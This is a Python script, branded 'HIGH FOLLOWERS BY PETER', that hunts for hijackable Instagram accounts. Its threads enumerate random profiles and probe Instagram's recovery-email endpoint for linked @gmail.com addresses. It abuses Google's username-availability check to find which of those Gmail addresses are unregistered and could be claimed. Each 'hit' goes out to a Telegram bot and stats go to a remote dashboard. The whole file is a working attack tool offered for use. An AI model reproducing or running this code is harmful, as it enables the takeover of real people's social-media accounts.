import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
from colorama import init

init(autoreset=True)

# ================= FIXED DASHBOARD SYNC LOGIC =================
def send_to_dashboard(stat_type):
    try:
        # Render Live URL - Localhost Render par block hota hai
        url = 'https://system-override-v2.onrender.com/update_stats'
        requests.post(url, json={'type': stat_type}, timeout=3)
    except:
        pass

# Dashboard automatically ID aur Token bhejta hai
if len(sys.argv) > 2:
    ID = sys.argv[1]
    TOKEN = sys.argv[2]
else:
    ID = input("\033[1;36mEnter Telegram ID: ")
    TOKEN = input("\033[1;36mEnter Bot Token: ")
# =========================================================

# Terminal Colors
B = '\033[1;36;40m'; C1 = '\x1b[38;5;120m'; M = '\x1b[1;37m'; E = '\033[1;31m'
W9 = "\033[1m\033[34m"; R = '\033[1;31;40m'; RESET = "\033[0m"

ASCII_ART = r"""
██████╗░███████╗████████╗███████╗██████╗░
██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██████╔╝█████╗░░░░░██║░░░█████╗░░██████╔╝
██╔═══╝░██╔══╝░░░░░██║░░░██╔══╝░░██╔══██╗
██║░░░░░███████╗░░░██║░░░███████╗██║░░██║
╚═╝░░░░░╚══════╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝
            HIGH FOLLOWERS BY PETER
"""

print(C1 + ASCII_ART)

# Config
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
TOKEN_FILE = 'tl.txt'
jod_domain = '@gmail.com' 
stats_lock = Lock()

# Global Stats
hits_count = 0
bad_count = 0
valid_ig = 0
infoinsta = {}

def JodScript():
    """Initial Google Token Setup - Required for Gmail Checking"""
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        res1 = requests.get("https://accounts.google.com/signin/v2/usernamerecovery?hl=en-GB", headers=headers)
        match = re.search('data-initial-setup-data=".*?&quot;(.*?)&quot;', res1.text)
        if match:
            tok = match.group(1)
            host = ''.join(choice(alphabet) for _ in range(20))
            with open(TOKEN_FILE, 'w') as f: f.write(f"{tok}//{host}")
            print(C1 + "[*] Google Token Generated Successfully.")
        else:
            time.sleep(3)
            JodScript()
    except Exception as e:
        time.sleep(3)
        JodScript()

# Token setup on start
if not os.path.exists(TOKEN_FILE):
    JodScript()

def check_gmail(email_prefix):
    global hits_count, bad_count
    try:
        if not os.path.exists(TOKEN_FILE): JodScript()
        with open(TOKEN_FILE, 'r') as f: 
            data_file = f.read().split('//')
            tl, host = data_file[0], data_file[1]
        headers = {'google-accounts-xsrf': '1', 'User-Agent': generate_user_agent()}
        data = f"f.req=%5B%22TL%3A{tl}%22%2C%22{email_prefix}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
        res = requests.post("https://accounts.google.com/_/signup/usernameavailability", headers=headers, data=data, cookies={'__Host-GAPS': host})
        
        if '"gf.uar",1' in res.text:
            with stats_lock: hits_count += 1
            send_to_dashboard('hit')
            return True
        else:
            with stats_lock: bad_count += 1
            send_to_dashboard('bad')
            return False
    except: return False

def check_instagram_link(email):
    global valid_ig, bad_count
    headers = {'User-Agent': generate_user_agent(), 'Content-Type': 'application/x-www-form-urlencoded'}
    data = {'signed_body': f'sign.{{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj","query":"{email}"}}', 'ig_sig_key_version': '4'}
    try:
        res = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data).text
        if email in res:
            valid_ig += 1
            if check_gmail(email.split('@')[0]):
                send_hit_telegram(email)
        else:
            send_to_dashboard('bad')
            with stats_lock: bad_count += 1
    except: pass

def send_hit_telegram(email):
    user = email.split('@')[0]
    info = infoinsta.get(user, {})
    msg = f"""
━━━━━━━━━━━━━━━
☄️ TEAM TX HIT FOUND!
👤 USER: {user}
📧 EMAIL: {email}
📈 FOLLOWERS: {info.get('follower_count', 'N/A')}
💀 OWNER: Peter
━━━━━━━━━━━━━━━
"""
    try:
        requests.get(f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={msg}")
    except: pass

def worker():
    while True:
        lsd = ''.join(random.choices(string.ascii_letters + string.digits, k=32))
        # Fresh ID range for better hitting results
        data = {
            'lsd': lsd,
            'variables': json.dumps({'id': random.randrange(2500000000, 21254029834), 'render_surface': 'PROFILE'}),
            'doc_id': '25618261841150840'
        }
        try:
            res = requests.post('https://www.instagram.com/api/graphql', headers={'X-FB-LSD': lsd}, data=data)
            user_data = res.json().get('data', {}).get('user', {})
            username = user_data.get('username')
            # Filter: Media count > 0 ensures account is active/real
            if username and user_data.get('media_count', 0) > 0:
                infoinsta[username] = user_data
                check_instagram_link(username + jod_domain)
        except: 
            time.sleep(2)

# Execution - 15 threads for stability on Render free tier
for _ in range(15): 
    Thread(target=worker, daemon=True).start()

while True:
    time.sleep(10)
